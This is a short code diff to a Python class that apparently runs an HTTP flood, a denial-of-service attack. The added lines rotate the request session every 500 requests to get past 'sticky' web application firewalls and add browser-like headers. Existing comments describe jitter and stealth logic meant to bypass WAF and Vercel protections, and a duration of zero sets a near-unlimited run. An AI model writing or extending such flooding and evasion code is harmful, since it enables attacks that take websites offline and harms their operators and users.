@@ -47,10 +47,18 @@ class SpecialTools:
             # * Unlimited duration if set to 0
             timeout = (time.time() + duration) if duration > 0 else (time.time() + 999999)
             session = requests.Session()
+            request_count = 0
             
             while time.time() < timeout and self.isFlooding:
                 if hasattr(self, 'core') and self.core and self.core.stop_requested:
                     break
+                
+                # * Session Rotation v5.8.16 (Bypass Sticky WAF)
+                request_count += 1
+                if request_count % 500 == 0:
+                    session.close()
+                    session = requests.Session()
+
                 try:
                     # -- NITRO BOOST OPTIMIZATION v5.8.15 --
                     # Jitter & Stealth Logic (Bypass WAF/Vercel)
@@ -66,6 +74,8 @@ class SpecialTools:
                         'Accept-Encoding': 'gzip, deflate, br',
                         'Connection': 'keep-alive',
                         'Upgrade-Insecure-Requests': '1',
+                        'DNT': '1',
+                        'X-Requested-With': 'XMLHttpRequest',
                         'Sec-Fetch-Dest': 'document',
                         'Sec-Fetch-Mode': 'navigate',
                         'Sec-Fetch-Site': 'none',
